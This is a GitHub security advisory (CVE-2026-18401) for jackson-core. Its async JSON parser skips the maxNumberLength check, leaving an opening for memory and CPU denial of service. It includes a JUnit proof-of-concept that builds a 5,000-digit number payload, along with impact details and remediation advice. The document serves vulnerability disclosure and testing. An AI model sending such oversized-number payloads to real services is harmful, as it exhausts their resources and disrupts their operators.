# [M] jackson-core: Number Length Constraint Bypass in Async Parser Leads to Potential DoS Condition

## Summary
Severity: Medium
Advisory: GHSA-72hv-8253-57qq
CVE: CVE-2026-18401
CWE: CWE-770
Ecosystem: Maven
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-02-28
Source: https://github.com/advisories/GHSA-72hv-8253-57qq
Type: github-advisory

## Affected
- Maven: `tools.jackson.core:jackson-core` — affected >=3.0.0 <3.1.0
- Maven: `com.fasterxml.jackson.core:jackson-core` — affected >=2.19.0 <2.21.1
- Maven: `com.fasterxml.jackson.core:jackson-core` — affected >=2.15.0 <2.18.6

## Details
### Summary
The non-blocking (async) JSON parser in `jackson-core` bypasses the `maxNumberLength` constraint (default: 1000 characters) defined in `StreamReadConstraints`. This allows an attacker to send JSON with arbitrarily long numbers through the async parser API, leading to excessive memory allocation and potential CPU exhaustion, resulting in a Denial of Service (DoS).

The standard synchronous parser correctly enforces this limit, but the async parser fails to do so, creating an inconsistent enforcement policy.

### Details
The root cause is that the async parsing path in `NonBlockingUtf8JsonParserBase` (and related classes) does not call the methods responsible for number length validation.

- The number parsing methods (e.g., `_finishNumberIntegralPart`) accumulate digits into the `TextBuffer` without any length checks.
- After parsing, they call `_valueComplete()`, which finalizes the token but does **not** call `resetInt()` or `resetFloat()`.
- The `resetInt()`/`resetFloat()` methods in `ParserBase` are where the `validateIntegerLength()` and `validateFPLength()` checks are performed.
- Because this validation step is skipped, the `maxNumberLength` constraint is never enforced in the async code path.

### PoC
The following JUnit 5 test demonstrates the vulnerability. It shows that the async parser accepts a 5,000-digit number, whereas the limit should be 1,000.

```java
package tools.jackson.core.unittest.dos;

import java.nio.charset.StandardCharsets;

import org.junit.jupiter.api.Test;

import tools.jackson.core.*;
import tools.jackson.core.exc.StreamConstraintsException;
import tools.jackson.core.json.JsonFactory;
import tools.jackson.core.json.async.NonBlockingByteArrayJsonParser;

import static org.junit.jupiter.api.Assertions.*;

/**
 * POC: Number Length Constraint Bypass in Non-Blocking (Async) JSON Parsers
 *
 * Authors: sprabhav7, rohan-repos
 * 
 * maxNumberLength default = 1000 characters (digits).
 * A number with more than 1000 digits should be rejected by any parser.
 *
 * BUG: The async parser never calls resetInt()/resetFloat() which is where
 * validateIntegerLength()/validateFPLength() lives. Instead it calls
 * _valueComplete() which skips all number length validation.
 *
 * CWE-770: Allocation of Resources Without Limits or Throttling
 */
class AsyncParserNumberLengthBypassTest {

    private static final int MAX_NUMBER_LENGTH = 1000;
    private static final int TEST_NUMBER_LENGTH = 5000;

    private final JsonFactory factory = new JsonFactory();

    // CONTROL: Sync parser correctly rejects a number exceeding maxNumberLength
    @Test
    void syncParserRejectsLongNumber() throws Exception {
        byte[] payload = buildPayloadWithLongInteger(TEST_NUMBER_LENGTH);
		
		// Output to console
        System.out.println("[SYNC] Parsing " + TEST_NUMBER_LENGTH + "-digit number (limit: " + MAX_NUMBER_LENGTH + ")");
        try {
            try (JsonParser p = factory.createParser(ObjectReadContext.empty(), payload)) {
                while (p.nextToken() != null) {
                    if (p.currentToken() == JsonToken.VALUE_NUMBER_INT) {
                        System.out.println("[SYNC] Accepted number with " + p.getText().length() + " digits — UNEXPECTED");
                    }
                }
            }
            fail("Sync parser must reject a " + TEST_NUMBER_LENGTH + "-digit number");
        } catch (StreamConstraintsException e) {
            System.out.println("[SYNC] Rejected with StreamConstraintsException: " + e.getMessage());
        }
    }

    // VULNERABILITY: Async parser accepts the SAME number that sync rejects
    @Test
    void asyncParserAcceptsLongNumber() throws Exception {
        byte[] payload = buildPayloadWithLongInteger(TEST_NUMBER_LENGTH);

        NonBlockingByteArrayJsonParser p =
            (NonBlockingByteArrayJsonParser) factory.createNonBlockingByteArrayParser(ObjectReadContext.empty());
        p.feedInput(payload, 0, payload.length);
        p.endOfInput();

        boolean foundNumber = false;
        try {
            while (p.nextToken() != null) {
                if (p.currentToken() == JsonToken.VALUE_NUMBER_INT) {
                    foundNumber = true;
                    String numberText = p.getText();
                    assertEquals(TEST_NUMBER_LENGTH, numberText.length(),
                        "Async parser silently accepted all " + TEST_NUMBER_LENGTH + " digits");
                }
            }
            // Output to console
            System.out.println("[ASYNC INT] Accepted number with " + TEST_NUMBER_LENGTH + " digits — BUG CONFIRMED");
            assertTrue(foundNumber, "Parser should have produced a VALUE_NUMBER_INT token");
        } catch (StreamConstraintsException e) {
            fail("Bug is fixed — async parser now correctly rejects long numbers: " + e.getMessage());
        }
        p.close();
    }

    private byte[] buildPayloadWithLongInteger(int numDigits) {
        StringBuilder sb = new StringBuilder(numDigits + 10);
        sb.append("{\"v\":");
        for (int i = 0; i < numDigits; i++) {
            sb.append((char) ('1' + (i % 9)));
        }
        sb.append('}');
        return sb.toString().getBytes(StandardCharsets.UTF_8);
    }
}

```


### Impact
A malicious actor can send a JSON document with an arbitrarily long number to an application using the async parser (e.g., in a Spring WebFlux or other reactive application). This can cause:
1.  **Memory Exhaustion:** Unbounded allocation of memory in the `TextBuffer` to store the number's digits, leading to an `OutOfMemoryError`.
2.  **CPU Exhaustion:** If the application subsequently calls `getBigIntegerValue()` or `getDecimalValue()`, the JVM can be tied up in O(n^2) `BigInteger` parsing operations, leading to a CPU-based DoS.

### Suggested Remediation

The async parsing path should be updated to respect the `maxNumberLength` constraint. The simplest fix appears to ensure that `_valueComplete()` or a similar method in the async path calls the appropriate validation methods (`resetInt()` or `resetFloat()`) already present in `ParserBase`, mirroring the behavior of the synchronous parsers.

**NOTE:** This research was performed in collaboration with [rohan-repos](https://github.com/rohan-repos)

## References
- https://github.com/FasterXML/jackson-core/security/advisories/GHSA-72hv-8253-57qq
- https://nvd.nist.gov/vuln/detail/CVE-2026-18401
- https://github.com/FasterXML/jackson-core/pull/1555
- https://github.com/FasterXML/jackson-core/commit/b0c428e6f993e1b5ece5c1c3cb2523e887cd52cf
- https://github.com/FasterXML/jackson-core
